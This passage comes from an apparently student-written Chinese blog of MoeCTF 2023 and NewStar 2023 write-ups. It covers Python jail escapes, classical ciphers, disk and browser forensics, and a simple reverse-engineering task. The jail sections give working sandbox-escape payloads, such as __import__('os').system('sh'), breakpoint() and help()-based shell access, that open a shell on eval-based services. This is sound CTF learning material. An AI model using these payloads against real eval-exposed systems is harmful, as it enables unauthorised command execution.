<p>网上搜到有个思路是二次传参，exec(input())但是超了一个字符</p>
<p>有个breakpoint()函数，可以打开一个叫pdb(python debugger)的调试器，这个调试器可以执行python代码，还有打断点调试代码</p>
<p>进入后用第一题的__ import __ (‘os’).system(‘sh’)就能打开一个终端，然后 cat flag拿到flag</p>
<p>flag{Wk1Sp0Q4gA6at3kySUmJhtdZq_AitxwJ}</p>
<h2 id="Jail-lavel-2"><a href="#Jail-lavel-2" class="headerlink" title="Jail lavel 2"></a>Jail lavel 2</h2><p>这里加了个长度限制</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">6</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>

<p>可以使用help()函数 查看sys模块，sys模块下有个: 可以传递参数过去当shell命令执行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">help()</span><br><span class="line">sys</span><br><span class="line">!</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<p>flag{iQR2CFeLlJ8Hi8ydPGs-HVHXSmGiQxwP}</p>
<h2 id="Jail-Level-3-未解决"><a href="#Jail-Level-3-未解决" class="headerlink" title="Jail Level 3 [未解决]"></a>Jail Level 3 [未解决]</h2><p>长度不超过12 且不可用breakpoint ,hint中help被禁用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">BANLIST = [<span class="string">&#x27;breakpoint&#x27;</span>]</span><br><span class="line">BANLIST_WORDS = <span class="string">&#x27;|&#x27;</span>.join(<span class="string">f&#x27;(<span class="subst">&#123;WORD&#125;</span>)&#x27;</span> <span class="keyword">for</span> WORD <span class="keyword">in</span> BANLIST)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> re.findall(BANLIST_WORDS, user_input_data, re.I):</span><br><span class="line">  <span class="keyword">raise</span> Exception(<span class="string">&#x27;Blacklisted word detected! you are hacker!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer result: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>



<h2 id="Jail-Level-4"><a href="#Jail-Level-4" class="headerlink" title="Jail Level 4"></a>Jail Level 4</h2><p>是一个不断循环 的eval(input)，python2.7环境的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>拿到flag flag{MvhG6P0cpa4yavJzq6gcJAYgGfNSi5yZ}</p>
<h2 id="Leak-Leval-0"><a href="#Leak-Leval-0" class="headerlink" title="Leak Leval 0"></a>Leak Leval 0</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_key_into_local_but_valid_key_into_remote = <span class="string">&quot;moectfisbestctfhopeyoulikethat&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;| Options: | [V] uln | [B] ackdoor &quot;</span>)</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">        not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;vvvveeee&#x27;</span>) <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            challenge_choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">        <span class="keyword">if</span> challenge_choice == <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;code &gt;&gt; &quot;</span>) <span class="keyword">if</span> (<span class="built_in">len</span>(code) &gt; <span class="number">9</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>) <span class="keyword">if</span> func_filter(code):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! byte~&quot;</span>) exit(<span class="number">0</span>) <span class="built_in">print</span>(<span class="built_in">eval</span>(code)) <span class="keyword">elif</span> challenge_choice == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>) key = <span class="built_in">input</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>) <span class="keyword">if</span> (key == fake_key_into_local_but_valid_key_into_remote):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Hey Admin,please input your code:&quot;</span>)</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;backdoor &gt;&gt; &quot;</span>) <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>vuln 9的长度可以用globals() 将真正的key给找出来，然后用backdoor执行代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">globals() #找到了key &#x27;key_6366a131649a4e9b&#x27;: &#x27;4e86eda06366a131649a4e9be1a9f217&#x27;</span><br><span class="line">4e86eda06366a131649a4e9be1a9f217</span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;GjyJBWFLfQoLO8qiZpIMjKQEjl-MBKnq&#125;</span><br></pre></td></tr></table></figure>





<h1 id="Classical-Crypto"><a href="#Classical-Crypto" class="headerlink" title="Classical Crypto"></a>Classical Crypto</h1><h2 id="ezrot"><a href="#ezrot" class="headerlink" title="ezrot"></a>ezrot</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@64E7LC@Ecf0:D0;FDE020D:&gt;!=60=6EE6C0DF3DE:EFE:@?04:!96C0tsAJdEA6d;F&#125;%0N</span><br></pre></td></tr></table></figure>

<p>查询了一下rot编码的原理，原理是将字符的ascii往前推</p>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a> 使用这里的rot47拿到flag，少了个m需要补充一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;rot47_is_just_a_simPle_letter_substitution_ciPher_EDpy5tpe5juNT_&#125;</span><br></pre></td></tr></table></figure>



<h2 id="可可的新围墙"><a href="#可可的新围墙" class="headerlink" title="可可的新围墙"></a>可可的新围墙</h2><p>搜索围墙这个词，搜到了栅栏密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt3_hsTal3yGnM_p3jocfFn3cp3_hFs3c_3TrB__i3_uBro_lcsOp&#125;e&#123;ciri_hT_avn3Fa_j</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=777">http://www.atoolbox.net/Tool.php?Id=777</a> 在线解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;F3nc3_ciph3r_shiFTs_3ach_l3TT3r_By_a_Giv3n_nuMB3r_oF_plac3s_Ojpj&#125;</span><br></pre></td></tr></table></figure>



<h2 id="皇帝的新密码"><a href="#皇帝的新密码" class="headerlink" title="皇帝的新密码"></a>皇帝的新密码</h2><p>观察长度，字符结构，像是将每个字符的ascii偏移n位，搜索到了凯撒密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tvljam&#123;JhLzhL_JPwoLy_Pz_h_cLyF_zPtwPL_JPwoLy!_ZmUVUA40q5KbEQZAK5Ehag4Av&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.lddgo.net/encrypt/caesar-cipher">https://www.lddgo.net/encrypt/caesar-cipher</a> 偏移7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;CaEsaE_CIphEr_Is_a_vErY_sImpIE_CIphEr!_SfNONT40j5DuXJSTD5Xatz4To&#125;</span><br></pre></td></tr></table></figure>



<h2 id="不是“皇帝的新密码”"><a href="#不是“皇帝的新密码”" class="headerlink" title="不是“皇帝的新密码”"></a>不是“皇帝的新密码”</h2><p>这个题好坑啊，这里这个md5是key的md5，不是flag的md5，但是上面写着md5 of flag，我解了半天出不来，想来想去也不是代码逻辑有问题，弄了几组数据进去，脚本都没有问题。</p>
<p>密文看起来像是每位都偏移了n位，明文前六位是moectf，然后跑了一下脚本发现每位偏移都不太一样，也没有什么规律。后面发现是维吉尼亚密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">scsfct&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;</span><br><span class="line"></span><br><span class="line">md5 of flag (utf-8) `ea23f80270bdd96b5fcd213cae68eea5`</span><br></pre></td></tr></table></figure>

<p>网上查询到，维吉尼亚密码首先要确定key的长度，算出来是7，然后前六位moectf算出前六位key，爆破第七位和md5比较拿到key解密flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">virginiaCrack</span>(<span class="params">cipherText,key</span>): <span class="comment"># 解密函数</span></span><br><span class="line">    length = getKeyLen(cipherText) <span class="comment">#得到密钥长度</span></span><br><span class="line">    <span class="comment"># key = getKey(cipherText,length) #找到密钥</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.ascii_letters:</span><br><span class="line">        key = <span class="string">&quot;moectf&quot;</span> + i</span><br><span class="line">        keyStr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">            keyStr+=k</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;the key:&#x27;</span>,keyStr)</span><br><span class="line">        plainText = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> cipherText:</span><br><span class="line">                c = <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch)-<span class="built_in">ord</span>(key[index%length]))%<span class="number">26</span>+<span class="number">97</span>)</span><br><span class="line">                plainText += c</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(plainText)</span><br><span class="line">        <span class="keyword">return</span> plainText</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据明文和密文偏移关系求前面的key</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_key</span>(<span class="params">plaintext, ciphertext</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> p, c <span class="keyword">in</span> <span class="built_in">zip</span>(plaintext, ciphertext):</span><br><span class="line">        p_idx = alphabet.index(p)</span><br><span class="line">        c_idx = alphabet.index(c)</span><br><span class="line"></span><br><span class="line">        k_idx = (c_idx - p_idx) % <span class="number">26</span></span><br><span class="line">        key += alphabet[k_idx]</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt_extended</span>(<span class="params">ciphertext, key</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    key = key.lower()</span><br><span class="line">    key_expanded = (key * (<span class="built_in">len</span>(ciphertext) // <span class="built_in">len</span>(key) + <span class="number">1</span>))[:<span class="built_in">len</span>(ciphertext)]</span><br><span class="line">    key_index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">            k = key_expanded[key_index]</span><br><span class="line">            c_idx = alphabet.index(c)</span><br><span class="line">            k_idx = alphabet.index(k)</span><br><span class="line"></span><br><span class="line">            p_idx = (c_idx - k_idx) % <span class="number">26</span></span><br><span class="line">            plaintext += alphabet[p_idx]</span><br><span class="line"></span><br><span class="line">            key_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            plaintext += c</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5_hash</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(text.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">plaintext_prefix = <span class="string">&quot;moectf&quot;</span></span><br><span class="line">ciphertext_prefix = <span class="string">&quot;scsfct&quot;</span></span><br><span class="line">md5_target = <span class="string">&quot;ea23f80270bdd96b5fcd213cae68eea5&quot;</span></span><br><span class="line">ciphertext = <span class="string">&quot;scsfct&#123;wOuSQNfF_IWdkNf_Jy_o_zLchmK_voumSs_zvoQ_loFyof_FRdiKf_4i4x4NLgDn&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#前六位key</span></span><br><span class="line">key_prefix = vigenere_key(plaintext_prefix, ciphertext_prefix)</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆破第七位key</span></span><br><span class="line">key_candidates = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"><span class="keyword">for</span> candidate <span class="keyword">in</span> key_candidates:</span><br><span class="line">    test_key = key_prefix + candidate</span><br><span class="line">    decrypted_text = vigenere_decrypt_extended(ciphertext_prefix, test_key)</span><br><span class="line">    <span class="keyword">if</span> md5_hash(decrypted_text) == md5_target:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line">ciphertext_lower = ciphertext.lower()</span><br><span class="line">decrypted_text_full = vigenere_decrypt_extended(ciphertext_lower, test_key)</span><br><span class="line">decrypted_text_restored = <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">    [decrypted_text_full[i] <span class="keyword">if</span> c.islower() <span class="keyword">else</span> decrypted_text_full[i].upper() <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(ciphertext)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(decrypted_text_restored)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;vIgENErE_CIphEr_Is_a_lIttlE_hardEr_thaN_caEsar_CIphEr_4u4u4EXfXz&#125;</span><br></pre></td></tr></table></figure>





<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h1 id="ai"><a href="#ai" class="headerlink" title="ai"></a>ai</h1><h2 id="AI入门指北"><a href="#AI入门指北" class="headerlink" title="AI入门指北"></a>AI入门指北</h2><p>在这找到不带gpu版本的安装命令 <a target="_blank" rel="noopener" href="https://pytorch.org/">https://pytorch.org/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;install_torch_torchvision_torchaudio&#125;</span><br></pre></td></tr></table></figure>



<h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="随身携带的虚拟机"><a href="#随身携带的虚拟机" class="headerlink" title="随身携带的虚拟机"></a>随身携带的虚拟机</h2><p>校园网好卡，附件下载了半天，解压后发现全是vmdk的文件</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jcjic/article/details/118241188">https://blog.csdn.net/jcjic/article/details/118241188</a> 根据这篇文章创建了一个win10虚拟机然后导入vmdk进入了系统</p>
<p>发现有一个磁盘被bitlook锁住了，然后在回收站这发现了这个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">BitLocker Drive Encryption recovery key </span><br><span class="line"></span><br><span class="line">To verify that this is the correct recovery key, compare the start of the following identifier with the identifier value displayed on your PC.</span><br><span class="line"></span><br><span class="line">Identifier:</span><br><span class="line"></span><br><span class="line">	4DFEE901-55AC-43EB-96F4-FFE09609952A</span><br><span class="line"></span><br><span class="line">If the above identifier matches the one displayed by your PC, then use the following key to unlock your drive.</span><br><span class="line"></span><br><span class="line">Recovery Key:</span><br><span class="line"></span><br><span class="line">	702801-061622-323125-555819-258544-713713-089331-406373</span><br><span class="line"></span><br><span class="line">If the above identifier doesn&#x27;t match the one displayed by your PC, then this isn&#x27;t the right key to unlock your drive.</span><br><span class="line">Try another recovery key, or refer to https://go.microsoft.com/fwlink/?LinkID=260589 for additional assistance.</span><br></pre></td></tr></table></figure>

<p>解锁磁盘后发现flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bW9lY3Rme0JhczFjX0QxNWtfRjByM25zMWNzIX0=</span><br></pre></td></tr></table></figure>

<p>base64解码获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Bas1c_D15k_F0r3ns1cs!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="坚持访问的浏览器"><a href="#坚持访问的浏览器" class="headerlink" title="坚持访问的浏览器"></a>坚持访问的浏览器</h2><p>查询资料后发现在 ~&#x2F;.mozilla&#x2F;firefox&#x2F;…….. 下有个places.sqlite存储浏览器的历史记录和标签。</p>
<p>然后 moz_places表中存储网站url 标题等相关信息</p>
<p>在这个表中发现了<a target="_blank" rel="noopener" href="https://hymint.space/~koito/">https://hymint.space/~koito/</a> 这个网站，尝试访问一下发现打开了，没什么功能</p>
<p>f12找到了flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">  I am always thinking about creating a flag that is safe enough.</span><br><span class="line">  I came up with lots of ideas and moectf&#123;Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4&#125;</span><br><span class="line">  Next step is to hide it into this page!</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Th15_iS_d3f1ni7e1y_1Ast_0NE_30a13cfb8426e919ecd4c5627cde4fa4&#125;</span><br></pre></td></tr></table></figure>



<h2 id="锁定起来的同人文"><a href="#锁定起来的同人文" class="headerlink" title="锁定起来的同人文"></a>锁定起来的同人文</h2><p>一开始不太懂dumpmem.raw和qaq.hc 是什么文件，搜索了一下后发现一个是内存镜像，一个是用VeraCrypt加密的文件。然后找到了这个内存软件</p>
<p><a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility3/">https://github.com/volatilityfoundation/volatility3/</a> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">volatility_2.6_win64_standalone.exe -f dumpmem.raw --profile Win2016x64_14393 filescan | findstr /R &quot;txt png jpg gif zip rar 7z pdf doc&quot;</span><br></pre></td></tr></table></figure>

<p>找到一个key 0x958246a8c550	\Users\Administrator\Desktop\key_pixiv_id105614615.png	，但是dumpfile不下来，翻了很多issue还有试过换3,也是dump不下来</p>
<p>一开始考虑到图片下载网站略缩图的原因，可能我根据id搜下载下来的key不正确，最后dumpfile没有思路的时候，试了一下搜索下载当key，然后解出来了</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv3744376/">https://www.bilibili.com/read/cv3744376/</a> p站搜id的方法</p>
<p><a target="_blank" rel="noopener" href="http://www.pixiv.net/member.php?id=105614615">http://www.pixiv.net/member.php?id=105614615</a> 搜到了图片 解密了.hc文件</p>
<p>tmp目录下发现 history.db siyuan.db还有pandoc，搜了一下pandoc是一个文档转换的程序，siyuan是一个插件，在siyuan.db中的 block_fts_content中发现了.sy的文件名还有内容</p>
<p>NVXWKY3UMZ5VGMC7MQZTG4DMPFPUQMLEMRSW4IL5 这像是某种编码，根据搜索编码特征后，发现是base32</p>
<p><a target="_blank" rel="noopener" href="https://www.lzltool.cn/Tools/Base32Decode">https://www.lzltool.cn/Tools/Base32Decode</a></p>
<p>解密后得到flag </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;S0_d33ply_H1dden!&#125;</span><br></pre></td></tr></table></figure>



<p>ww，moectf学到挺多东西的捏，入门了re和pwn，后面比较忙就没有继续做了qaq</p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2023-12-28</span><span class="leancloud_visitors"></span><span>About 13815 words, 46 min 3 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a></h3></div><div class="post-content"><div class="card"><p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="easy-RE"><a href="#easy-RE" class="headerlink" title="easy_RE"></a>easy_RE</h2><p>确实是打开就有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;we1c0me_to_rev3rse!!&#125;</span><br></pre></td></tr></table></figure>



<h2 id="elf"><a href="#elf" class="headerlink" title="elf"></a>elf</h2><p>inputString 先异或然后+16 然后base64encode后和flag cmp，decode后-16 异或就好了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s1 = (char *)base64_encode(v6, v3);</span><br><span class="line">  if ( !strcmp(s1, &quot;VlxRV2t0II8kX2WPJ15fZ49nWFEnj3V8do8hYy9t&quot;) )</span><br><span class="line">  </span><br><span class="line"> ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall encode(const char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  size_t v1; // rax</span><br><span class="line">  int v2; // eax</span><br><span class="line">  _BYTE *v4; // [rsp+20h] [rbp-20h]</span><br><span class="line">  int i; // [rsp+28h] [rbp-18h]</span><br><span class="line">  int v6; // [rsp+2Ch] [rbp-14h]</span><br><span class="line"></span><br><span class="line">  v1 = strlen(a1);</span><br><span class="line">  v4 = malloc(2 * v1 + 1);</span><br><span class="line">  v6 = 0;</span><br><span class="line">  for ( i = 0; i &lt; strlen(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = v6++;</span><br><span class="line">    v4[v2] = (a1[i] ^ 0x20) + 16;</span><br><span class="line">  &#125;</span><br><span class="line">  v4[v6] = 0;</span><br><span class="line">  return v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

